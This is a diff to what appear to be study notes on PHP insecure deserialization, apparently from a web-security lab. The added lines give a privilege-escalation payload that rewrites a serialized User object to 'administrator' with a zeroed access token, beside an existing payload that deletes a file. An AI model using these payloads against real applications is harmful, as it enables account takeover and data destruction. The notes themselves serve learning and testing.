@@ -9,6 +9,11 @@ We could delete files by creating an object and sending in a valid parameter:
 O:14:"Delete":1:{s:14:"lock_file_path";s:23:"/home/shrek/payslip.txt";}
 ```
 
+A basic privilege escalation:
+`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mo9iwmmkmyv7opm4fmdjy4e8brusnvey";}`
+Change to:
+`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
+
 Objects are serialized as:  
 `O:<i>:"<s>":<i>:{<properties>}`  
 where the first `<i>` is an integer representing the string length of `<s>`, and `<s>` is the fully qualified class name (class name prepended with full namespace). The second `<i>` is an integer representing the number of object properties. `<properties>` are zero or more serialized name value pairs:  
